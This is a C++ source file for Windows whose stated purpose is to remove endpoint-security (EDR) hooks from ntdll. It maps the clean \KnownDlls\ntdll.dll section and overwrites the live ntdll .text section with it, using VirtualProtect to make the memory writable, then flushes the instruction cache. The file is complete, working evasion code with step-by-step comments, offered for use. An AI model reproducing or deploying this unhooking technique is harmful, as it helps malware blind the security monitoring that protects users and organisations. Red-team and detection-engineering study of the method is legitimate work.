#include<Windows.h>
#include<winternl.h>
#include<stdio.h>

//
// ============================================================
//  KnownDlls.cpp
//  Unhook ntdll by pulling a clean copy from the \KnownDlls
//  object directory instead of reading the file from disk.
//
//  \KnownDlls\ntdll.dll is a named section object that Windows
//  pre-loads at boot from the on-disk image before any EDR
//  injects — the bytes inside are guaranteed clean. We open
//  the section, map a view, then restore .text from it.
//
//  Flow:
//    1. Locate live ntdll base from PEB
//    2. OpenFileMappingA on "KnownDlls\\ntdll.dll"
//    3. MapViewOfFile to get a readable clean copy
//    4. Walk .text in both, VirtualProtect + memcpy
//    5. UnmapViewOfFile + CloseHandle
//
// ============================================================
//

typedef struct _LDR_ENTRY
{
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID      DllBase;
    PVOID      EntryPoint;
    ULONG      SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} LDR_ENTRY, * PLDR_ENTRY;

static PVOID
KnownDlls_GetNtdllBase(VOID)
{
    CONST PEB* Peb = (PEB*)NtCurrentTeb()->ProcessEnvironmentBlock;
    CONST LIST_ENTRY* Head = &Peb->Ldr->InMemoryOrderModuleList;

    for (LIST_ENTRY* E = Head->Flink; E != Head; E = E->Flink)
    {
        PLDR_ENTRY Ldr = CONTAINING_RECORD(E, LDR_ENTRY, InMemoryOrderLinks);

        if (Ldr->BaseDllName.Buffer &&
            _wcsicmp(Ldr->BaseDllName.Buffer, L"ntdll.dll") == 0)
        {
            return Ldr->DllBase;
        }
    }

    return NULL;
}

static BOOL
KnownDlls_GetTextSection(
    _In_  PVOID  Base,
    _Out_ PVOID* OutAddr,
    _Out_ DWORD* OutSize
)
{
    CONST PIMAGE_DOS_HEADER DosHdr = (PIMAGE_DOS_HEADER)Base;
    CONST PIMAGE_NT_HEADERS NtHdrs =
        (PIMAGE_NT_HEADERS)((PBYTE)Base + DosHdr->e_lfanew);

    CONST WORD SectionCount = NtHdrs->FileHeader.NumberOfSections;
    CONST WORD OptHdrSize = NtHdrs->FileHeader.SizeOfOptionalHeader;

    CONST PIMAGE_SECTION_HEADER Sections = (PIMAGE_SECTION_HEADER)(
        (PBYTE)Base +
        DosHdr->e_lfanew +
        sizeof(DWORD) +
        sizeof(IMAGE_FILE_HEADER) +
        OptHdrSize
        );

    for (WORD i = 0; i < SectionCount; i++)
    {
        if (Sections[i].Name[0] == '.' &&
            Sections[i].Name[1] == 't' &&
            Sections[i].Name[2] == 'e' &&
            Sections[i].Name[3] == 'x' &&
            Sections[i].Name[4] == 't' &&
            Sections[i].Name[5] == '\0')
        {
            *OutAddr = (PVOID)((PBYTE)Base + Sections[i].VirtualAddress);
            *OutSize = Sections[i].Misc.VirtualSize;
            return TRUE;
        }
    }

    return FALSE;
}

static BOOL
KnownDlls_Unhook(VOID)
{
    printf("[+] KnownDlls unhook start\n");

    //
    // Step 1 — live ntdll base.
    //
    PVOID LiveBase = KnownDlls_GetNtdllBase();
    if (LiveBase == NULL)
    {
        printf("[-] KnownDlls: could not locate live ntdll\n");
        return FALSE;
    }
    printf("[*] Live ntdll -> %p\n", LiveBase);

    //
    // Step 2 — open the \KnownDlls\ntdll.dll section using NT API.
    //
    typedef NTSTATUS(NTAPI* PFN_NT_OPEN_SECTION)(
        PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES);

    PFN_NT_OPEN_SECTION NtOpenSection = (PFN_NT_OPEN_SECTION)
        GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtOpenSection");

    if (NtOpenSection == NULL)
    {
        printf("[-] KnownDlls: NtOpenSection not found\n");
        return FALSE;
    }

    UNICODE_STRING SectionName;
    CONST WCHAR SectionPath[] = L"\\KnownDlls\\ntdll.dll";
    SectionName.Buffer = (PWSTR)SectionPath;
    SectionName.Length = (USHORT)((wcslen(SectionPath)) * sizeof(WCHAR));
    SectionName.MaximumLength = SectionName.Length + sizeof(WCHAR);

    OBJECT_ATTRIBUTES ObjAttr = { 0 };
    ObjAttr.Length = sizeof(OBJECT_ATTRIBUTES);
    ObjAttr.ObjectName = &SectionName;
    ObjAttr.Attributes = OBJ_CASE_INSENSITIVE;

    HANDLE hSection = NULL;
    NTSTATUS Status = NtOpenSection(&hSection, SECTION_MAP_READ, &ObjAttr);

    if (Status != 0 || hSection == NULL)
    {
        printf("[-] KnownDlls: NtOpenSection failed (0x%08X)\n", Status);
        return FALSE;
    }
    printf("[*] KnownDlls section opened -> %p\n", hSection);

    //
    // Step 3 — map a read-only view using MapViewOfFile.
    //
    CONST PVOID CleanBase = MapViewOfFile(hSection, FILE_MAP_READ, 0, 0, 0);
    CloseHandle(hSection);

    if (CleanBase == NULL)
    {
        printf("[-] KnownDlls: MapViewOfFile failed (%d)\n", GetLastError());
        return FALSE;
    }
    printf("[*] Clean view mapped -> %p\n", CleanBase);

    //
    // Step 4 — locate .text in both copies.
    //
    PVOID HookedText = NULL;
    DWORD HookedSize = 0;
    PVOID CleanText = NULL;
    DWORD CleanSize = 0;

    if (KnownDlls_GetTextSection(LiveBase, &HookedText, &HookedSize) == FALSE ||
        KnownDlls_GetTextSection(CleanBase, &CleanText, &CleanSize) == FALSE)
    {
        printf("[-] KnownDlls: .text section not found\n");
        UnmapViewOfFile(CleanBase);
        return FALSE;
    }

    printf("[*] .text hooked -> %p  (%u bytes)\n", HookedText, HookedSize);
    printf("[*] .text clean  -> %p\n", CleanText);

    //
    // Step 5 — unlock hooked .text, overwrite, restore protection.
    //
    DWORD OldProtect = 0;
    if (VirtualProtect(HookedText, HookedSize, PAGE_EXECUTE_READWRITE, &OldProtect) == FALSE)
    {
        printf("[-] KnownDlls: VirtualProtect RWX failed (%d)\n", GetLastError());
        UnmapViewOfFile(CleanBase);
        return FALSE;
    }

    CopyMemory(HookedText, CleanText, HookedSize);

    VirtualProtect(HookedText, HookedSize, OldProtect, &OldProtect);
    
    //
    // Flush instruction cache why? -> CPUs may still execute cached instructions
    // after we modified executable memory. This ensures the CPU sees the
    // new code on the next fetch.
    //
    FlushInstructionCache(GetCurrentProcess(), HookedText, HookedSize);
    
    printf("[+] KnownDlls: .text restored (%u bytes)\n", HookedSize);

    //
    // Step 6 — unmap the clean view.
    //
    UnmapViewOfFile(CleanBase);

    printf("[+] KnownDlls unhook complete\n");
    return TRUE;
}


INT main(VOID)
{
    INT Result = KnownDlls_Unhook() ? 0 : 1;
    
    printf("\nPress any key to exit...\n");
    getchar();
    
    return Result;
}
